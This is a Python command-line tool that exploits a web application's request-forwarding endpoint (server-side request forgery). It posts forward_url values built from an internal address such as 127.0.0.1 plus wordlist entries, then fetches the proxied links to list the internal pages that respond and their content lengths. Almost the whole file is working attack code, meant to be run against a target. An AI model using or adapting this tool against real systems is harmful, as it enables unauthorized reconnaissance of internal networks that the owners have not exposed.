import argparse
import requests
import time
import progressbar
import concurrent.futures

#global place_tracker


def count_words(wordlist_a):
    with open(wordlist_a, 'r') as fp:
        for count, line in enumerate(fp):
            pass
    return count


def internal_request(internal_link):
    response = requests.get(internal_link.rstrip())
    if response.status_code == 200:
        len(response.text)
        res_tuple = (str(internal_link[internal_link.rindex('/') + 1:]), len(response.text))
        return res_tuple


def test_request(urltarget, dynamic_section, internal, word, index, sleep=0):
    #for seclists
    if word[0] == '#':
        return
    response = requests.post(urltarget + dynamic_section + str(index), params={
        "forward_url": internal + word.rstrip(), "proxy_response": "true", "insecure_tls": "false",
        "expand_path": "true", "capacity": "1000"
    })
    if response.status_code == 201:
        temp = internal_request(urltarget.rsplit('/', urltarget.count('/') - 2)[0] + '/' + word)
        if temp is None:
            return
        else:
            results.append(temp)
    time.sleep(sleep)


def api_request(urltarget, dynamic_section, wordlist_f, ms, internal):
    index = 1
    listing = open(wordlist_f, "r")
    with concurrent.futures.ThreadPoolExecutor() as executioner:
        futures = []
        for word in listing:
            futures.append(executioner.submit(test_request, urltarget=urltarget, dynamic_section=dynamic_section,
                                              internal=internal, word=word, index=index, sleep=ms))
    listing.close()


def parse_it():
    parser = argparse.ArgumentParser(description='Wordlist, url_link, ms')
    parser.add_argument('-w', type=str, help='Wordlist file')
    parser.add_argument('-target', type=str,
                        help='The static section of the url EX:) ~>http://target.com/<~your_created_link')
    parser.add_argument('-dynamic', type=str,
                        help='The dynamic section of the url EX:) http://target.com/~>your_created_link<~')
    parser.add_argument('-m', type=int, help='ms per request')
    parser.add_argument('-internal_target', type=str,
                        help='The internal web server address EX:) http://127.0.0.1/path/leading/to/search/')
    args = parser.parse_args()
    return args.w, args.target, args.dynamic, args.m, args.internal_target


if __name__ == '__main__':
    wordlist, target, dynamic, ms, internal_target = parse_it()
    '''list_count = count_words(wordlist)
    widgets = [' [',
               progressbar.Timer(format='elapsed time: %(elapsed)s'),
               '] ',
               progressbar.Bar('*'), ' (',
               progressbar.ETA(), ') ',
               ]
    bar = progressbar.ProgressBar(max_value=list_count,
                                  widgets=widgets).start()'''
    results = []
    #place_tracker = 0
    api_request(target, dynamic, wordlist, ms, internal_target)
    for i in results:
        print('Page: ' + str(i[0]) + ' Content Length: ' + str(i[1]))
